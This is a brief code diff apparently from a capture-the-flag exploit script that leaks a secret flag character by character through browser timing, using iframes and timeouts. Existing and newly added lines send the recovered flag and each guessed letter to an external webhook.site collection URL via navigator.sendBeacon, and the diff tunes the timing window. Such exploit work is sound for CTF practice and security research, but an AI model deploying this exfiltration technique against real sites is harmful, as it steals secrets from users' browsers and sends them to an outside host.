@@ -59,6 +59,7 @@
         navigator.sendBeacon('https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b',flag);
         // for every letter in the alphabet, try to extended the flag with it
         for(let c of alphabet){
+            navigator.sendBeacon('https://webhook.site/ebf8aa6a-e1af-40da-98bc-c8c64d920b0b',c);
             // After 500 ms, remove the iframes, set the URL with the extended flag
             // send a message to the parent about found prefix, and reload the document
             // to restore the blocked thread
@@ -71,7 +72,7 @@
                 await sleep(50);
                 location.replace(url.href);
                 return;
-            }, 1000);
+            }, 500);
 
             // try to find another letter, if it is fast enough, the above setTimeout
             // will be cleared, else, it will trigger.
